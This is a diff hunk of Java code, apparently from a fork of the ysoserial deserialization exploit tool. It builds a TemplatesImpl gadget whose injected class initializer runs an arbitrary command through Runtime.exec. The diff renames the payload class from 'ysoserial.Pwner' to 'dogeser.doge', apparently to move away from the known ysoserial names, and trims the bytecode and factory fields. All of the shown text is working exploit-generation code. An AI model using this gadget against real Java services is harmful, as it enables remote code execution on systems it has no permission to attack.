@@ -64,15 +64,15 @@ public class Gadgets_orgin {
         CtClass clazz = pool.get(Gadgets_orgin.StubTransletPayload.class.getName());
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";
         clazz.makeClassInitializer().insertAfter(cmd);
-        clazz.setName("ysoserial.Pwner");
+        clazz.setName("dogeser.doge");
         CtClass superC = pool.get(abstTranslet.getName());
         clazz.setSuperclass(superC);
         byte[] classBytes = clazz.toBytecode();
         System.out.println(Arrays.toString(classBytes));
         System.out.println(Arrays.toString(ClassFiles.classAsBytes(Gadgets_orgin.Foo.class)));
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets_orgin.Foo.class)});
-        Reflections.setFieldValue(templates, "_name", "Pwnr");
-        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
+        Reflections.setFieldValue(templates, "_name", "Doge");
+//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
 
